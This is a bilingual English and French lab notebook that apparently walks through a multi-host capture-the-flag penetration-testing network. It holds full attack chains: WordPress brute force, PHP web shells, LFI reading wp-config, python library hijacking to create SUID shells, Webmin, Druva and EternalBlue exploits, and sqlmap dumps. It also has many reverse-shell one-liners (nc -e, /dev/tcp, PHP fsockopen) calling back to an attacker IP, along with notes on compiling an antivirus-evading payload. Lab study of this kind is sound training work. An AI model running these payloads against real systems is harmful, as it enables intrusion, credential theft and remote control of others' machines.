hayk sysdes
nmap -sn -T4 IP_net -oN active-hosts 
- this commande to discover up hosts
nmap -T4 -sC -sV -p- --min-rate=1000 IP
- this commande to discovers all open TCP ports on an IP
ftp IP 
anonymous / anonymous
- default ftp creds for anonymous login
ls 
get file.txt
- ftp commandes
ip:65000/robots.txt
- 65000 is the port hosting http server (nmap results)
#📦 first flag
wpscan --url http://10.10.110.100:65000/wordpress --enumerate vp
wpscan --url http://10.10.110.100:65000/wordpress --enumerate u
- scan and enumerate wp
cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt wpscan --url http://10.10.110.100:65000/wordpress --usernames names.txt -- passwords words.txt
/wordpress/wp-admin/ <- login with the founded creds as wp admin
- This can be leveraged execute commands on the server by inserting php code in one of the files. Navigate to "Appearance" > "Theme Editor" and select the Twenty Nineteen theme.
https://reverseshell.com/ and execute a reverse shell 
within the rev shell lets spawn a bash 
python3 -c 'import pty;pty.spawn("/bin/bash")'
#📦 flag 2
priv esc -> bash history perm...
#📦  flag3

ifconfig
- gives that we ve an other net interface lets scan it
for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' - f4|tr -d ':' &);done
in order to perform a pivoting within the network lets upgrade to a ssh by adding our pubkey to /root/.ssh/authorized_keys
ssh -i id_rsa -D 9050 root@10.10.110.100 <-- make sure to conf the proxychains.conf file
-> ligolo-ng
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5 <-- lets scan the discoverd net
we discovered an http running lets connect
proxychains firefox
navigate a round the page and test the diff params we discover a path traversal vuln in the page param
http://ip/?page=../../../../etc/passwd
the previeus nmap scan revels samba service running lets use the discoverd creds 
proxychains smbclient -L \\172.16.1.10
lets try root and no password OK
proxychains smbclient \\\\172.16.1.10\\SlackMigration
get administrator.txt
http://ip/wordpress
notworking but the admin.txt tells thats its running over web root
web root is /var/www/html
let s use our vuln page param to LFI
http://ip/?pages=/var/www/html/index.html
http://ip/?pages=/var/www/html/wordpress/index.php
**What is a wrapper?**  
A wrapper is a prefix (like `http://`, `file://`, `php://`) that tells PHP _how_ to fetch or handle data, while you keep using the same functions (`fopen`, `include`, `file_get_contents`). Same function, different "adapter" behind it.

### The `php://` wrapper family

| Wrapper        | Purpose                                                                                                                                      | Direction                         |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `php://stdin`  | Read input typed by the user (CLI)                                                                                                           | Input                             |
| `php://stdout` | Write output to the terminal (CLI)                                                                                                           | Output                            |
| `php://input`  | Read the **raw request body** sent by a client (e.g. JSON in a POST request, not captured by `$_POST`)                                       | Input                             |
| `php://output` | Write data **directly to the response/browser**, useful when a function only knows how to write to a stream (e.g. generating a CSV download) | Output                            |
| `php://filter` | **Transform data while reading/writing it**, by chaining one or more filters (e.g. `string.toupper`, `convert.base64-encode`)                | In-between (transformation layer) |

Basic filter syntax:

```
php://filter/read=FILTER_NAME/resource=SOURCE_FILE
```

Multiple filters can be chained with `|`.

### The key security concept: why `php://filter` matters in LFI

If a vulnerable script does:

php

```php
include($_GET['page']);
```

**Direct access to a PHP file** (`?page=/path/to/wp-config.php`) makes PHP **execute** that file as code. Since files like `wp-config.php` only _define variables_ (no `echo`), nothing is printed back — you get an empty response, even though the code ran internally. The secrets are "consumed" silently, never displayed.
php://filter/read=convert.base64-encode/resource=/etc/passwd php://filter/read=string.rot13/resource=/etc/passwd 172.16.1.10/nav.php?page=php://filter/convert.base64- encode/resource=/var/www/html/wordpress/wp-config.php
curl "172.16.1.10/nav.php?page=php://filter/convert.base64- encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d > wpconfig.php

lets login with those creads over ssh
? <-- to list the commandes 
vim is present --> gtfobins 
:set shell=/bin/bash :shell
#📦 flag4

```
/home/utilisateur/.config/
```

ou en variable d'environnement :

```
$XDG_CONFIG_HOME    (par défaut = ~/.config)
```
here is the default file config location within the unix based os let s explore it, knowing from the admintodo.txt that the Slack integration task was pending, let s search creads apis convos...

---> frunk creads found lets login as frunk and esclate priv
list cron jobs
# Fiche mémo — pspy, cron jobs et énumération utilisateurs (Linux)

## 1. Télécharger pspy

### Binaire précompilé (le plus simple)

```bash
# 64 bits statique (recommandé, fonctionne presque partout, ~4MB)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# 32 bits statique
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32

# Versions "small" (~1MB, dépendent de libc, compressées UPX)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s

chmod +x pspy64
```

### Depuis les sources (avec Go)
https://github.com/DominicBreuker/pspy

```bash
git clone https://github.com/DominicBreuker/pspy.git
cd pspy
go build -o pspy cmd/main.go
```

### Via Docker

```bash
git clone https://github.com/DominicBreuker/pspy.git
cd pspy
make build-build-image
make build
```

### Transférer sur la machine cible

```bash
# Sur votre machine (attaquant)
python3 -m http.server 8000

# Sur la machine cible
wget http://VOTRE_IP:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
```

---

## 2. Utiliser pspy — tous les modes

```bash
./pspy64                          # mode par défaut : affiche les commandes exécutées
./pspy64 -f                       # + affiche aussi les événements du système de fichiers
./pspy64 -p                       # affiche les commandes (activé par défaut, explicite)
./pspy64 -c                       # affichage coloré
./pspy64 -r /etc                  # surveille /etc récursivement (sous-dossiers inclus)
./pspy64 -r /etc -r /opt          # surveille plusieurs dossiers récursivement
./pspy64 -d /etc/cron.d           # surveille un dossier SANS récursivité
./pspy64 -i 100                   # scan procfs toutes les 100ms (capture processus très courts)
./pspy64 -pf -i 100 -c            # combo courant : commandes + fichiers + scan rapide + couleurs
```

**Dossiers surveillés par défaut (sans `-r`/`-d`) :** `/usr`, `/tmp`, `/etc`, `/home`, `/var`, `/opt`

**Astuce :** laisser tourner pspy plusieurs minutes pour capturer un cycle cron complet (souvent 1, 5 ou 15 min).

---

## 3. Lister et lire les cron jobs

### Cron système (tous les utilisateurs, config globale)

```bash
cat /etc/crontab                          # crontab système principale
ls -la /etc/cron.d/                       # tâches cron additionnelles (par paquet/service)
cat /etc/cron.d/*

ls -la /etc/cron.daily/                   # scripts exécutés quotidiennement
ls -la /etc/cron.hourly/                  # scripts exécutés toutes les heures
ls -la /etc/cron.weekly/                  # scripts exécutés chaque semaine
ls -la /etc/cron.monthly/                 # scripts exécutés chaque mois
```

### Cron de TOUS les utilisateurs (nécessite souvent les droits root)

```bash
ls -la /var/spool/cron/crontabs/          # liste les utilisateurs ayant une crontab (Debian/Ubuntu)
cat /var/spool/cron/crontabs/*            # contenu de chaque crontab

# Sur certaines distributions (RedHat/CentOS) :
ls -la /var/spool/cron/
cat /var/spool/cron/*
```

### Cron de l'utilisateur courant uniquement

```bash
crontab -l                                # liste la crontab de l'utilisateur actuel
crontab -l -u <nom_utilisateur>           # crontab d'un autre utilisateur (si droits suffisants)
```

### Vérifier les permissions d'un script cron (piste d'exploitation)

```bash
ls -la /chemin/vers/script_cron.sh        # vérifier si le fichier est modifiable
find / -writable -type f 2>/dev/null | grep -i cron   # scripts cron accessibles en écriture
```

---

## 4. Lister les utilisateurs de la machine

### Liste basique

```bash
cat /etc/passwd                           # tous les comptes (utilisateurs + services)
cut -d: -f1 /etc/passwd                   # juste les noms d'utilisateurs
```

### Filtrer les utilisateurs "réels" (avec shell de connexion, pas les comptes système)

```bash
cat /etc/passwd | grep -E "/bin/bash|/bin/sh|/bin/zsh"
awk -F: '$7 ~ /sh$/ {print $1}' /etc/passwd
```

### Utilisateurs actuellement connectés

```bash
who                                       # utilisateurs connectés actuellement
w                                         # + ce qu'ils font
last                                      # historique des connexions
```

### Utilisateur courant et ses groupes

```bash
whoami                                    # utilisateur courant
id                                        # UID, GID, groupes de l'utilisateur courant
groups                                    # groupes de l'utilisateur courant
```

### Utilisateurs avec accès sudo

```bash
sudo -l                                   # droits sudo de l'utilisateur courant
cat /etc/sudoers 2>/dev/null              # fichier sudoers (droits root requis en général)
ls -la /etc/sudoers.d/
getent group sudo                         # membres du groupe sudo (Debian/Ubuntu)
getent group wheel                        # membres du groupe wheel (RedHat/CentOS)
```

### Dossiers personnels existants (indice sur les vrais utilisateurs)

```bash
ls -la /home/
```

---

## 5. Workflow recommandé en pentest/CTF

1. **Énumérer les utilisateurs** → `/etc/passwd`, `/home/`
2. **Lire les crons statiques** → `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/crontabs/`
3. **Lancer pspy en parallèle** pour observer l'exécution réelle → `./pspy64 -pf -i 100`
4. **Croiser les infos** : un script cron root modifiable, ou un secret visible en argument de commande, sont souvent la clé d'une élévation de privilèges.


ls -la frunk --> we found a python script executed every min with root priv 

```python

>>> import sys
>>> sys.path ['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
``` 

python search the imported modules within the current folder if exists then it will be loaded, not it search in the listed directories 
lets hijack the urllib library by making an file named urllib.py contains

import os os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")

after a min we obtain the #📦 root flag

lets scan the next host within our ip list
proxychains nmap 172.16.1.17 -sT -sV -Pn -T5
samba http on 80 and 10000 lets try samba with 
proxychains smbclient -L \\172.16.1.17
proxychains smbclient \\\\172.16.1.17\\forensics 
the share contains a file named monitor
file monitor --> pcap file
http --> creds OK
web min vuln search
https://github.com/roughiz/Webmin-1.910-Exploit-Script
nc -lvnp 1234
proxychains python webmin_exploit.py --rhost 172.16.1.17 --lhost 10.10.14.2 -- lport 1234 -u admin -p Password6543
#📦 flag
lets scan the next ip
proxychains nmap 172.16.1.13 -sT -sV -Pn -T5
80 and 443 OPEN
gobuster dir -p socks5://127.0.0.1:9050 --url http://172.16.1.13/ -w common.txt
directory found lets search sploits
python3 -m http.server 80
Download it to the host by issuing the following command in the browser. Next, stand up a Netcat listener on port 1234 ( nc -lvnp 1234 ) and issue the below command in the browser to send a reverse shell. A shell on DANTE-WS01 is received as gerald . The flag can be found in the desktop. http://172.16.1.13/discuss/ups/shell.php?cmd=powershell wget http://10.10.14.2/nc.exe -o nc.exe http://172.16.1.13/discuss/ups/shell.php?cmd=nc.exe -e cmd.exe 10.10.14.2 1234
# Netcat (nc) Cheat Sheet

## 1. Basics

```bash
nc -h                          # help / options
which nc                       # check if installed
nc -v <host> <port>            # connect verbosely
```

Common flags:

|Flag|Meaning|
|---|---|
|`-l`|listen mode (server)|
|`-p`|specify local port|
|`-v` / `-vv`|verbose / more verbose|
|`-n`|no DNS resolution (faster, avoids leaks)|
|`-w <sec>`|timeout for connections/idle|
|`-u`|UDP mode (default is TCP)|
|`-z`|zero-I/O mode (used for scanning)|
|`-k`|keep listening after client disconnects (some versions)|
|`-e <cmd>`|execute a program on connection (not always available, security risk)|

---

## 2. Simple chat / connection test

**Listener (server):**

```bash
nc -lvnp 4444
```

**Client (connect to listener):**

```bash
nc -nv <target_ip> 4444
```

Type on either side — text is sent to the other. Good for testing connectivity/firewalls.

---

## 3. Port scanning

```bash
nc -zv <target_ip> 20-80              # scan a port range, TCP
nc -zv -u <target_ip> 20-80           # scan a port range, UDP
nc -zvn <target_ip> 22                # scan single port, no DNS
```

`-z` = don't send data, just check if the port is open.

---

## 4. Banner grabbing

```bash
nc -nv <target_ip> 80
# then type:
HEAD / HTTP/1.1
Host: <target_ip>
<press Enter twice>
```

Useful to identify services/software versions on open ports.

---

## 5. File transfer

**Receive a file (listener side):**

```bash
nc -lvnp 4444 > received_file.txt
```

**Send a file (client side):**

```bash
nc -nv <target_ip> 4444 < file_to_send.txt
```

**Transfer a whole directory (tar over nc):**

```bash
# Receiver
nc -lvnp 4444 | tar xzvf -

# Sender
tar czvf - /path/to/folder | nc -nv <target_ip> 4444
```

---

## 6. Reverse shell (target connects back to attacker)

**Attacker (listener):**

```bash
nc -lvnp 4444
```

**Target (connects back, sends shell):**

```bash
# If nc has -e (GNU netcat / some builds)
nc -e /bin/sh <attacker_ip> 4444

# If -e is not available (common on modern nc), use a FIFO:
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Bash-only alternative (no nc needed on target):
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

---

## 7. Bind shell (target listens, attacker connects)

**Target (listener, waits for connection):**

```bash
nc -lvnp 4444 -e /bin/sh
```

**Attacker (connects to target):**

```bash
nc -nv <target_ip> 4444
```

> Note: bind shells are easily blocked by firewalls protecting inbound traffic; reverse shells are more commonly used in practice.

---

## 8. Remote Code Execution (RCE) via nc

Netcat itself doesn't have a "vulnerability" — RCE with nc means using it to **get a shell (i.e., arbitrary command execution) on a remote machine**. This is exactly what reverse/bind shells above achieve; here's it framed explicitly as RCE, plus a few extra angles.

### a) Direct RCE with `-e` (one-shot command execution)

If `-e` is available, nc will execute the given program and pipe its I/O over the connection — this **is** RCE by design:

```bash
# Attacker listener
nc -lvnp 4444

# Target — executes /bin/sh and hands it to the attacker
nc -e /bin/sh <attacker_ip> 4444
```

Anyone who can run this command on the target has achieved code execution as that user. This is why `-e` is stripped from many modern nc builds (Debian's `nc.openbsd` in particular) — it turns nc into a ready-made backdoor.

### b) RCE without `-e` (FIFO / `/dev/tcp`)

Already covered above — same result (arbitrary shell access), just without relying on the `-e` flag:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f
```

or, without nc on the target at all:

```bash
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

### c) Using nc to _deliver_ RCE against a vulnerable service

nc is often the tool used to **trigger** an RCE bug in another service (e.g. a vulnerable network daemon that executes whatever it receives, or a web app command injection you interact with over a raw socket):

```bash
# Send a crafted payload to a vulnerable service listening on a port
nc -nv <target_ip> <port> < payload.txt

# Interactive: type the payload manually
nc -nv <target_ip> <port>
```

Here, the RCE is in the _target service's_ code, not in nc — nc is just the transport used to reach it and catch the resulting shell (paired with a listener as in section 6/7).

### d) Getting RCE onto a target from a web LFI/RFI (tie-in to earlier discussion)

If you already have a way to write/execute a file on the target (e.g. via an LFI writing to a log, or a file upload), you can plant a one-liner that calls back to your nc listener:

```bash
# Payload written/executed on the target
php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

paired with:

```bash
nc -lvnp 4444
```

### Summary

|Scenario|Where the RCE actually lives|
|---|---|
|`nc -e /bin/sh <ip> <port>`|In nc's `-e` flag itself (by design)|
|FIFO / `/dev/tcp` reverse shell|In the shell interpreter, nc is just the pipe|
|Sending payload to a vulnerable service|In the target service's code; nc is the delivery tool|
|Web LFI/RFI + callback|In the web app vulnerability; nc just catches the shell|

---

## 9. Making pipes persistent (keep listener alive after disconnect)

```bash
nc -lvnp 4444 -k          # -k keeps listening for new connections (not all versions support it)

# Alternative with a loop:
while true; do nc -lvnp 4444; done
```

---

## 10. UDP mode

```bash
nc -u -lvnp 4444                 # UDP listener
nc -u -nv <target_ip> 4444       # UDP client
```

---

## 11. Quick reference table

| Task                   | Command                                                              |
| ---------------------- | -------------------------------------------------------------------- |
| Listener               | `nc -lvnp <port>`                                                    |
| Connect                | `nc -nv <ip> <port>`                                                 |
| Port scan              | `nc -zv <ip> <start>-<end>`                                          |
| Banner grab            | `nc -nv <ip> <port>` then send request                               |
| Send file              | `nc -nv <ip> <port> < file`                                          |
| Receive file           | `nc -lvnp <port> > file`                                             |
| Reverse shell (target) | `nc -e /bin/sh <attacker_ip> <port>`                                 |
| Bind shell (target)    | `nc -lvnp <port> -e /bin/sh`                                         |
| UDP listener           | `nc -u -lvnp <port>`                                                 |
| RCE (one-shot)         | `nc -e /bin/sh <attacker_ip> <port>`                                 |
| RCE (no `-e`, FIFO)    | `mkfifo /tmp/f; cat /tmp/f\|/bin/sh -i 2>&1\|nc <ip> <port> >/tmp/f` |

---

## 12. Notes / gotchas

- **`-e` is often removed** from modern nc builds (e.g. Debian's `ncat`/`nc.traditional` vs `nc.openbsd`) for security reasons. Check with `nc -h` if `-e` is listed; if not, use the FIFO method or `/dev/tcp` (bash-only, no nc required on target).
- **`ncat`** (from the Nmap project) is a more feature-rich alternative supporting SSL (`--ssl`), and is often used interchangeably with `nc`.
- Always test connectivity with a simple listener/client pair before assuming a firewall is blocking you.

Checking the installed software on the host shows the non-default program Druva inSync is installed.
The licence.txt reveals that the version of the software is 6.6.3
https://www.exploit-db.com/exploits/48505
powershell wget 10.10.14.2/druva.py -o druva.py
As shown in the exploit usage instructions, we'll add gerald user to administrators group
However, due to UAC (User Account Control) we are unable to read the flag on the Administrator desktop. Let's download nc.exe and then run the exploit to send us a reverse shell. This is successful, and a shell as nt authority\system is received on DANTE-WS01 . powershell wget 10.10.14.2/nc.exe -o C:\xampp\htdocs\discuss\ups\nc.exe c:\python27\python.exe druva.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc.exe 10.10.14.2 4444 -e cmd.exe"
#📦 flag

proxychains nmap 172.16.1.12 -sT -sV -Pn -T5
gobuster dir -p socks5://127.0.0.1:9050 --url http://172.16.1.12 -w common.txt
https://www.exploit-db.com/exploits/48615
Poc
http://172.16.1.12/blog/category.php?id=2%27
proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 --dbs --batch
proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D flag --dump
#📦 flag
proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db --table
proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db -T membership_users --dump
extract and crack hashes 
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
ssh with creds #📦 flag
priv esc
Examination of /home and /etc/passwd reveals that julian is a system user. Let's switch to that account by issuing the below command. There doesn't seem to be anything useful in Julian's home folder. We can enumerate the server with common privilege escalation scripts such as LinEnum or LinPEAS. LinPEAS highlighted that the sudo version is 1.8.27 , which is known to be vulnerable to a security bypass. The following command can be executed to obtain a root shell. This is successful, and the flag can be found in the root directory.
sudo -u#-1 /bin/bash
https://www.exploit-db.com/exploits/47502
#📦 flag
lets crack julian hash
john hash --wordlist=rockyou.txt

proxychains nmap 172.16.1.102 -sT -Pn -T5
https://www.exploit-db.com/exploits/48552
chmod +x exploit.sh proxychains ./exploit.sh -u http://172.16.1.102/ -m 1231231231 -p test -c "whoami"
python3 -m http.server 80 
proxychains ./exploit.sh -u http://172.16.1.102/ -m 1231231231 -p test -c "powershell wget 10.10.14.2/nc.exe -o nc.exe"
nc -lvnp 1234 proxychains ./exploit.sh -u http://172.16.1.102/ -m 1231231231 -p test -c "nc.exe -e cmd.exe 10.10.14.2 1234"
#📦 flag

Enumerating the host, we see that there's a non standard folder C:\Apps containing the file SERVER.EXE .
lets list connexions
Checking for locally running services shows that there is a service running on port 4444.
plink.exe
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
plink.exe -R 4444:127.0.0.1:4444 -l root -P 22 -pw toor 10.10.14.2
nc -vlpn 4444
netstat -o
tasklist|findstr 22304
server.exe require password and username
lets revers the server.exe
nc -lvnp 3333 > server.exe
nc.exe 10.10.14.2 3333 < c:\Apps\SERVER.EXE
strings SERVER.EXE
password and username FOUND
lets use them on port 4444
#📦 flag 
# pwn-----
proxychains nmap -sT -sV -Pn -T5 172.16.1.20
Nmap reveals many open ports. The host has DNS, Kerberos and LDAP services running, which indicates that we are looking at a domain controller. Let's browse to port 80.
**We notice that SMB is running and the host is Windows Server 2012 R2, which means that this host is possibly vulnerable to the (unauthenticated) Eternal Blue exploit. Let's first run check in order to validate the vulnerability by issuing the below commands. The output shows that the host is vulnerable. Let's run the exploit by issuing the below commands. proxychains msfconsole use exploit/windows/smb/ms17_010_psexec set RHOSTS 172.16.1.20 check**
The output shows that the host is vulnerable. Let's run the exploit by issuing the below commands. proxychains msfconsole use exploit/windows/smb/ms17_010_psexec set RHOSTS 172.16.1.20 check proxychains msfconsole use exploit/windows/smb/ms17_010_psexec set RHOSTS 172.16.1.20 set payload windows/x64/meterpreter/reverse_tcp set LHOST tun0 set LPORT 4444 run
#📦 flag
![[Pasted image 20260925101141.png]]
we found usernames and passwords, lets note them and enumerate the DC
net user
enumerate users carefully
#📦 flag
proxychains nmap -sT -Pn -sV -T5 172.16.1.37
ssh, http
lets check http
create an account and discovers the app
gobuster dir -p socks5://127.0.0.1:1080 --url http://172.16.1.37/ -w /usr/share/wordlists/dirb/common.txt -x php.bak
lets download the .bak files and analyse them
proxychains curl http://172.16.1.37/feedback.php.bak -o feedbak.php.bak
proxychains curl http://172.16.1.37/save.php.bak -o save.php.bak
------>pages 80s
``__destruct()``  func , whene phar:// wrapper is called an insecure desirialization is performed


#📦 flag
we ve a shell as pericles
proxychains scp LinEnum.sh pericles@172.16.1.37:/tmp/linenum.sh 
bash /tmp/linenum.sh
We see a non default systemd timer which executed few seconds ago.
lets view it
analyze it and esc our priv
echo 'cp /bin/sh /home/pericles/sh && chmod u+s /home/pericles/sh' > /usr/bin/tmp_delete.sh
After a minute, we see that sh is created with suid bit set.
````  
We can run the command below to get a root shell. 
/home/pericles/sh -p
Bash preserves the effective user ID (i.e. root) when the -p option is supplied at invocation, which gives us a shell as root. The flag can be found in the /root folder.
`````  

| Commande               | Résultat (si `sh` est SUID root)                |
| ---------------------- | ----------------------------------------------- |
| `/home/pericles/sh`    | le shell perd les droits root, vous restez vous |
| `/home/pericles/sh -p` | le shell garde les droits root, vous êtes root  |
### Exemple concret
```bash
$ id
uid=1000(pericles) gid=1000(pericles)

$ /home/pericles/sh -p
# id
uid=1000(pericles) euid=0(root)
```
Le `#` et `euid=0(root)` montrent que vous avez maintenant les droits root.
En résumé : `-p` = « garde les privilèges du fichier SUID au lieu de les abandonner ».


#📦 flag
proxychains nmap -sT -Pn -sV -T5 172.16.1.45
gobuster dir -p socks5://127.0.0.1:1080 --url http://172.16.1.35/ -w /usr/share/wordlist/dirb/big.txt
We see that the /elearning folder exists. Let's access it.
searching exploits
https://www.exploit-db.com/exploits/49375
Let's navigate to /elearning/admin and login as admin
<?php echo exec($_GET["cmd"]);?>
elearning/admin/uploads/shell.php
scp /usr/share/windows-resources/binaries/nc.exe root@10.10.110.100:/var/www/html/nc.exe
http://172.16.1.45/elearning/admin/uploads/shell.php?cmd=powershell wget 172.16.1.100/nc.exe -o nc.exe 
nc -lvnp 1234 http://172.16.1.45/elearning/admin/uploads/shell.php?cmd=nc.exe -e cmd.exe 1234 172.16.1.100
failes wind defender
https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp
Before compiling the exploit, change the IP address and port in the code
i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunctionsections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc
Repeat the steps above and execute prometheus.exe from the web shell.
#📦 flag
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
proxychains rdesktop -u administrator -p KingOfTheMountain 172.16.1.45
#📦 flag
proxychains nmap -sT -Pn -sV -T5 172.16.1.101
explore ftp
we have a list of usernames and passwords
proxychains msfconsole use auxiliary/scanner/ftp/ftp_login set PASS_FILE passwords.txt set USER_FILE users.txt set RHOSTS 172.16.1.101 run
GOT a valid creds lets login with those creds and get a message
for i in {0..10};do echo "WestminsterOrange$i" >> words.txt;done
password spray
apt-get install -y libssl-dev libffi-dev python-dev build-essential 
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec 
cd CrackMapExec
python3 setup.py install
proxychains cme winrm 172.16.1.101 -u dharding -p words.txt
proxychains evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange10
#📦 flag
IObit folder present in Program Files (x86) explore it and elvate our priv unqouted bin path
https://www.exploit-db.com/exploits/48543
to check ---> .\Get-ServiceAcl.ps1 "IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access
#📦 flag
proxychains nmap -sT -Pn -T5 -sV 172.16.1.5
ftp -> get flag
#📦 flag
page 100 ->>>to review
